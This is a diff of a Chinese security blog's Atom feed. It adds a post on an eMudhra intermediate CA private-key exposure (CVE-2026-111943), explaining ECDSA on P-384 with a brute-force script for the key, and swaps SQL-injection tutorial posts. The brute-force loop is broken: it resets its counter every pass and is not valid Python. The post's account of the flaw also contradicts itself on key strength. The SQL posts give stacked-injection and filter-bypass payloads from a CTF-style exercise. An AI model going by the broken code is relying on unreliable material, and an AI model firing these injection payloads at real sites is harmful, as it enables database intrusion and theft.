@@ -6,7 +6,7 @@
   <link href="https://smileless-l.github.io/atom.xml" rel="self"/>
   
   <link href="https://smileless-l.github.io/"/>
-  <updated>2026-10-22T16:58:46.600Z</updated>
+  <updated>2026-10-26T16:50:51.932Z</updated>
   <id>https://smileless-l.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2026-111943 eMudhra中级 CA 私钥泄露</title>
+    <link href="https://smileless-l.github.io/2026/10/27/CVE-2026-111943%20eMudhra%E4%B8%AD%E7%BA%A7%20CA%20%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"/>
+    <id>https://smileless-l.github.io/2026/10/27/CVE-2026-111943%20eMudhra%E4%B8%AD%E7%BA%A7%20CA%20%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/</id>
+    <published>2026-10-27T04:40:00.000Z</published>
+    <updated>2026-10-26T16:50:51.932Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="CVE-2026-111943-eMudhra中级-CA-私钥泄露"><a href="#CVE-2026-111943-eMudhra中级-CA-私钥泄露" class="headerlink" title="CVE-2026-111943 eMudhra中级 CA 私钥泄露"></a>CVE-2026-111943 eMudhra中级 CA 私钥泄露</h1><p>标签（空格分隔）： 数字签名</p><hr><h2 id="漏洞简要信息"><a href="#漏洞简要信息" class="headerlink" title="漏洞简要信息"></a>漏洞简要信息</h2><p>-<code>漏洞编号</code>： CVE-2026-111943</p><p>-<code>漏洞描述</code>：受影响的 8 张中级证书中，6 张为 TLS 签发证书（DV &#x2F; OV &#x2F; EV TLS CA - G3B、G3C），链至 emSign Root TLS CA - G3；2 张为代码签名证书（EM OV CS CA - G3B、G3C），链至 emSign Root CS CA - G3。此外还存在 Sectigo 签发的、链至 AAA Certificate Services 的交叉签名副本。</p><p>-<code>危害</code>：持有这些私钥的攻击者若处于网络中间位置，可对不检查证书吊销状态的客户端实施中间人攻击——伪造任意网站、窃取或篡改通信内容。由于这些中级证书在证书透明度（CT）日志中没有任何记录，强制校验 CT 的浏览器（Chrome、Edge、Firefox、Safari）不受影响；但 curl、wget、git、pip、apt 等使用系统信任库的组件无法获知吊销信息，会持续信任这些证书，必须通过本次更新修复。</p><p>-<code>漏洞等级</code>：  严重（CVSS 9.1）</p><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p>对于证书加密的算法采用P-384 椭圆曲线</p><p>$$<br>y^2 &#x3D; x^3 - 3x + b \bmod p<br>$$</p><p>而加密就是直接采用的选用私匙d（中间CA）和一个标准基点G，来创造公匙Q</p><center>$Q = d \cdot G$</center><p>如果正常生成这个私匙d，在以理想情况下具有接近 384 bits的熵（n的取值空间为$2^{384}$）。</p><p>先是对证书信息m进行一个摘要<code>e = bits2int(H(m))</code>，然后再用这个e带入进去证书加密。<br>此时再生成一个k （<strong>k不是私匙d</strong>）做一个在P-384上与G点乘得到点R,用R再获取签名分量r与s</p><p>$$<br>R &#x3D; G \cdot k<br>$$</p><p>$$<br>R &#x3D; (x_R, y_R)<br>$$</p><p>$$<br>r &#x3D; x_R \bmod n<br>$$</p><p>$$<br>s &#x3D; k^{-1}(e + dr) \bmod n<br>$$</p><p>$$<br>\sigma &#x3D; (r, s)<br>$$</p><p>这样就得到了用于验证的σ</p><h3 id="验证方法"><a href="#验证方法" class="headerlink" title="验证方法"></a>验证方法</h3><p>验证者得到了消息M、签名（r、s）和公匙Q后通过以下验证是否合规</p><p>$$<br>w &#x3D; s^{-1} \bmod n<br>$$</p><p>$$<br>u_1 &#x3D; e w \bmod n<br>$$</p><p>$$<br>u_2 &#x3D; r w \bmod n<br>$$</p><p>$$<br>X &#x3D; u_1 G + u_2 Q<br>$$</p><p>$$<br>r &#x3D; X_x \bmod n<br>$$</p><h4 id="验证方法证明"><a href="#验证方法证明" class="headerlink" title="验证方法证明"></a>验证方法证明</h4><p>$$<br>s &#x3D; k^{-1}(e + dr) \bmod n<br>$$</p><p>$$<br>k &#x3D; e s^{-1} + d r s^{-1} \bmod n<br>$$</p><p>$$<br>k &#x3D; u_1 + d u_2 \bmod n<br>$$</p><p>$$<br>X &#x3D; u_1 G + u_2 Q &#x3D; u_1 G + u_2 d G &#x3D; k G &#x3D; R<br>$$</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>此时攻击者获得了Q,通过爆破d值来重新生成一个k，就可以直接伪造证书，由于该密匙过于简单我这里稍微写一下攻击获取d的思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF</span></span><br><span class="line">a = p - <span class="number">3</span></span><br><span class="line">b = <span class="number">0xB3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF</span></span><br><span class="line">Gx = <span class="number">0xAA87CA22BE8B05378EB1C71EF320AD746E1D3B628BA79B9859F741E082542A385502F25DBF55296C3A545E3872760AB7</span></span><br><span class="line">Gy = <span class="number">0x3617DE4A96262C6F5D9E98BF9292DC29F8F41DBD289A147CE9DA3113B5F0B8C00A60B1CE1D7E819D7A431D7C90EA0E5F</span></span><br><span class="line">n = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973</span></span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(F, [a, b])</span><br><span class="line">G = E(Gx, Gy)</span><br><span class="line"></span><br><span class="line">Q = ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      i = <span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span> i*G == Q:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;d=&#123;i&#125;&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span> i</span><br><span class="line">      i++</span><br></pre></td></tr></table></figure><p>甚至由于这个d值过于小而导致即使不使用别的算法如大步小步或者Pollard rho 来解，直接进行简单的爆破即可。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;CVE-2026-111943-eMudhra中级-CA-私钥泄露&quot;&gt;&lt;a href=&quot;#CVE-2026-111943-eMudhra中级-CA-私钥泄露&quot; class=&quot;headerlink&quot; title=&quot;CVE-2026-111943 eMudhra中级 </summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
+    
+    
+    <category term="数字签名" scheme="https://smileless-l.github.io/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
+    
+  </entry>
   
   <entry>
     <title>数字签名入门</title>
@@ -433,32 +457,6 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL&#39;select&#39;绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:20.554Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
-&lt;hr&gt;
-&lt;</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SQL union联合注入</title>
     <link href="https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
     <id>https://smileless-l.github.io/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
@@ -510,20 +508,20 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL空格绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
+    <title>SQL堆叠注入</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:40.978Z</updated>
+    <updated>2026-02-06T17:00:57.003Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
+    <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQL堆叠注入&quot;&gt;&lt;a href=&quot;#SQL堆叠注入&quot; class=&quot;headerlink&quot; title=&quot;SQL堆叠注入&quot;&gt;&lt;/a&gt;SQL堆叠注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
+&lt;p&gt;运用情况：当有过滤select&amp;#x2F;upd</summary>
       
     
     
@@ -531,7 +529,7 @@ MathJax = {
     <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
     
     
-    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
+    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
     
   </entry>
   
